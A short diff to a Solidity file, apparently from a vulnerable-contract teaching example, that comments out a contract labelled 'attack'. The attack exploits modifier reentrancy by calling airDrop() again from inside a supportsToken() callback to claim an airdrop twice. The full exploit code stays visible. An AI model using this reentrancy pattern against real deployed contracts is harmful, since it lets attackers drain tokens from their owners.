@@ -48,16 +48,16 @@ contract Bank{
     }
 }
 
-contract attack{ //An example of a contract that breaks the contract above.
-    bool hasBeenCalled;
-    function supportsToken() external returns(bytes32){
-        if(!hasBeenCalled){
-            hasBeenCalled = true;
-            ModifierEntrancy(msg.sender).airDrop();
-        }
-        return(keccak256(abi.encodePacked("Nu Token")));
-    }
-    function call(address token) public{
-        ModifierEntrancy(token).airDrop();
-    }
-}
+//contract attack{ //An example of a contract that breaks the contract above.
+//    bool hasBeenCalled;
+//    function supportsToken() external returns(bytes32){
+//        if(!hasBeenCalled){
+//             hasBeenCalled = true;
+//             ModifierEntrancy(msg.sender).airDrop();
+//         }
+//         return(keccak256(abi.encodePacked("Nu Token")));
+//     }
+//     function call(address token) public{
+//         ModifierEntrancy(token).airDrop();
+//     }
+// }
